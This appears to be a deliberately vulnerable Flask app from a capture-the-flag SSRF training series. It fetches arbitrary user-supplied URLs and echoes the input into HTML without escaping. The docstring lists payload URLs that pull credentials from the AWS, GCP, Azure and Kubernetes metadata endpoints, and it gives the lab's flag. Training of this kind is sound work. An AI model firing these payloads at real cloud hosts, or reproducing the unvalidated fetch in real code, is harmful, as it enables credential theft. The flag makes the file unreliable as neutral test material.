"""
SSRF Lab 13: Cloud Credentials Extraction
Difficulty: 3 (Advanced)
Points: 100

Description:
Extracting cloud service credentials via SSRF.
"""

from flask import Flask, request
import requests

app = Flask(__name__)

CREDENTIALS = {
    'aws': 'AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    'gcp': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImEwMmJjMTQ0In0.eyJhdWQiOiJodHRwczovL2Nsb3VkLnRhc2tzLmdvb2dsZS5jb20ifQ',
    'azure': 'eyJhY2Nlc3NfdG9rZW4iOiJleUpqZSJ9'
}

@app.route('/')
def index():
    """
    VULNERABLE: Cloud credentials extraction
    
    Attack Vector:
    AWS EC2:
    /?url=http://169.254.169.254/latest/meta-data/iam/credentials/role-name
    
    GCP:
    /?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
    
    Azure:
    /?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01
    
    Kubernetes:
    /?url=http://kubernetes.default.svc/var/run/secrets/kubernetes.io/serviceaccount/token
    
    Flag: FLAG{ssrf_cloud_credentials_013}
    """
    url = request.args.get('url', '')
    content = None
    error = None
    
    if url:
        try:
            headers = {
                'Metadata-Flavor': 'Google',
                'X-Goog-Metadata-Request': 'True'
            }
            response = requests.get(url, timeout=5, headers=headers)
            content = response.text[:1000]
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>Cloud Credentials Extractor</h1>
        <form method="GET">
            <input type="text" name="url" placeholder="Metadata endpoint" size="70" value="{url}">
            <button>Extract</button>
        </form>
        {f"<pre>{content}</pre>" if content else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

@app.route('/creds/<service>')
def creds(service):
    """Return cloud credentials"""
    if service in CREDENTIALS:
        return CREDENTIALS[service]
    return "Not found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5013, debug=False)
